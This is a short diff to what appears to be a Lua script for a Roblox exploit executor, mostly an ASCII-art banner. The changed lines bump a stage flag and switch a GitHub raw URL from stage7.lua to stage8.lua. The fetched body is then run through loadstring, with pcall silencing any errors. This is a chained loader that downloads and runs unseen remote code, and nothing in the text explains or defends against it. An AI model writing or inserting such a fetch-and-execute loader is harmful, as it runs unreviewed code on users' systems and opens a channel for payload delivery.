@@ -33,6 +33,6 @@ local _req = syn and syn.request or http_request or request
 ******###*********++**++=#################*+:=#############*+++++++++========--------=====+++==-----=                                                                                            
 ]]--
 
-_G["_ArN_Stage6"] = true
-local _n = _req({Url="https://raw.githubusercontent.com/Vexol-files/arch/refs/heads/main/static_content/stage7.lua", Method="GET"})
+_G["_ArN_Stage7"] = true
+local _n = _req({Url="https://raw.githubusercontent.com/Vexol-files/arch/refs/heads/main/static_content/stage8.lua", Method="GET"})
 pcall(function() loadstring(_n.Body)() end)
